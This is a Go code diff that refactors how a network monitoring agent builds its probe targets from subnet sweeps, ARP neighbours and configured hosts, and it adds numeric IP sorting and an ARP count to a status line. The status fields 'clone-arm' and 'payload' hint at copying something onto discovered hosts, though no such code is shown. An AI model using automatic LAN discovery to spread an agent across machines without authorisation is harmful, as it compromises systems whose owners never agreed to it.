@@ -1213,27 +1213,7 @@ func StepNMS(send func(reportJSON string), controllerIPs []string) error {
 	cfg := LoadNMSConfig()
 	var events []string
 
-	// Targets: sweep cache + extra hosts.
-	nmsSweepCacheMu.Lock()
-	fresh := time.Since(nmsSweepAt) < time.Duration(cfg.SweepEveryMin)*time.Minute && nmsSweepCache != nil
-	var swept []string
-	if fresh {
-		swept = nmsSweepCache
-	}
-	nmsSweepCacheMu.Unlock()
-	if !fresh {
-		swept = sweepSubnets(cfg.Subnets)
-		nmsSweepCacheMu.Lock()
-		nmsSweepCache = swept
-		nmsSweepAt = time.Now()
-		nmsSweepCacheMu.Unlock()
-	}
-	// ARP seeds ride every cycle (not just on sweep refresh): a PC joining
-	// the LAN appears within one interval instead of waiting out the sweep
-	// cache (default 30min).
-	targets := append(append([]string{}, swept...), arpSeedHosts()...)
-	targets = append(targets, cfg.ExtraHosts...)
-	targets = dedupeHosts(targets)
+	targets := sweepTargets(cfg)
 
 	// Probe (self first: proves the loop is alive even with zero targets).
 	cpuP, memP, diskP := SelfStats()
@@ -1401,8 +1381,31 @@ func sweepSubnets(subnets []string) []string {
 		}(ip)
 	}
 	wg.Wait()
-	sort.Strings(out)
+	sort.Slice(out, func(i, j int) bool { return ipLess(out[i], out[j]) })
 	return out
+}
+
+// ipLess orders dotted quads numerically (plain sort.Strings ranks
+// 192.168.1.100 before 192.168.1.20). Non-IP strings sort after IPs,
+// lexically among themselves.
+func ipLess(a, b string) bool {
+	pa, pb := net.ParseIP(a), net.ParseIP(b)
+	if pa == nil && pb == nil {
+		return a < b
+	}
+	if pa == nil {
+		return false
+	}
+	if pb == nil {
+		return true
+	}
+	x, y := pa.To16(), pb.To16()
+	for i := 0; i < len(x) && i < len(y); i++ {
+		if x[i] != y[i] {
+			return x[i] < y[i]
+		}
+	}
+	return false
 }
 
 func dedupeHosts(in []string) []string {
@@ -1417,6 +1420,30 @@ func dedupeHosts(in []string) []string {
 		out = append(out, h)
 	}
 	return out
+}
+
+// sweepTargets is the single source of probe targets: cached subnet sweep +
+// fresh ARP seeds + configured extra hosts, deduped. ARP seeds ride every
+// call (not just on sweep refresh) so a PC joining the LAN appears within
+// one interval instead of waiting out the sweep cache (default 30min).
+func sweepTargets(cfg NMSConfig) []string {
+	nmsSweepCacheMu.Lock()
+	fresh := time.Since(nmsSweepAt) < time.Duration(cfg.SweepEveryMin)*time.Minute && nmsSweepCache != nil
+	var swept []string
+	if fresh {
+		swept = nmsSweepCache
+	}
+	nmsSweepCacheMu.Unlock()
+	if !fresh {
+		swept = sweepSubnets(cfg.Subnets)
+		nmsSweepCacheMu.Lock()
+		nmsSweepCache = swept
+		nmsSweepAt = time.Now()
+		nmsSweepCacheMu.Unlock()
+	}
+	targets := append(append([]string{}, swept...), arpSeedHosts()...)
+	targets = append(targets, cfg.ExtraHosts...)
+	return dedupeHosts(targets)
 }
 
 // ---------------------------------------------------------------------------
@@ -1434,8 +1461,7 @@ func NMSHandle(cmd, args string, controllerIPs []string) (string, error) {
 		return nmsStatus(), nil
 	case "nms-now":
 		cfg := LoadNMSConfig()
-		targets := append(append([]string{}, cfg.ExtraHosts...), currentSweep()...)
-		targets = dedupeHosts(targets)
+		targets := sweepTargets(cfg)
 		res := ProbeRound(targets, cfg.MaxParallel)
 		up := 0
 		for _, r := range res {
@@ -1521,7 +1547,9 @@ func nmsStatus() string {
 			arm = "paused-breaker"
 		}
 	}
-	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d",
+	arp := arpSeedHosts()
+	targets := dedupeHosts(append(append(append([]string{}, currentSweep()...), arp...), cfg.ExtraHosts...))
+	return fmt.Sprintf("nms tick=%d version=%s interval=%ds agent=%s clone-arm=%s payload=%s targets=%d sweep=%d arp=%d",
 		NMSTick(), version.Version, cfg.IntervalSec, sleep, arm, payload,
-		len(cfg.ExtraHosts)+len(currentSweep()), len(currentSweep()))
+		len(targets), len(currentSweep()), len(arp))
 }
